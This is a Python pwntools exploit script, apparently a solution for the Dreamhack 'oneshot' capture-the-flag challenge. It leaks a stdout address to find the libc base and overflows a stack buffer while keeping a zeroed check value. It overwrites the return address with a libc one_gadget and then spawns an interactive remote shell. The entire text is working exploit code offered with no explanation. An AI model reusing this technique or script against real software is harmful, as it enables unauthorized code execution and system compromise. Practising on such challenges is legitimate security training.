from pwn import *

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 23298)
elf = ELF('./oneshot')
libc = ELF('./libc-2.23.so')

one_gadget = 0x45226
#one_gadget = 0x4527a
#one_gadget = 0xf03a4
#one_gadget = 0xf1247

# [1] Leak libc_base
p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1], 16)
lb = stdout - (libc.symbols["_IO_2_1_stdout_"])
one_gadget = lb + one_gadget

slog('STDOUT', stdout)
slog('libc base', lb)
slog('one gadget', one_gadget)

# [2] Exploit
msg = b'A' * 0x18
msg += p64(0)
msg += b'B' * 0x8
msg += p64(one_gadget)

p.sendafter('MSG: ', msg)

p.interactive()